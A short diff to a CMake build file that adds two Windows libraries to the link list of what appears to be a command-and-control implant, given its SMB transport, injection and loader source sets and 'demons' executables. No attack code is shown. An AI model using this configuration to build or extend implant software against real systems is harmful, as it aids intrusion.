@@ -79,7 +79,7 @@ add_compile_definitions( TRANSPORT_SMB )
 add_compile_definitions( AES256 )
 
 # linking library
-link_libraries( netapi32 ws2_32 wsock32 wtsapi32 iphlpapi mscoree mscorlib )
+link_libraries( netapi32 ws2_32 wsock32 wtsapi32 iphlpapi mscoree mscorlib advapi32 user32 )
 
 # add compiled demons
 add_executable( ${PROJECT_NAME} ${COMMON_SOURCE} ${INJECT_SOURCE} ${EXT_SOURCE} ${CRYPT_SOURCE} ${LOADER_SOURCE} ${MAIN_SOURCE} )
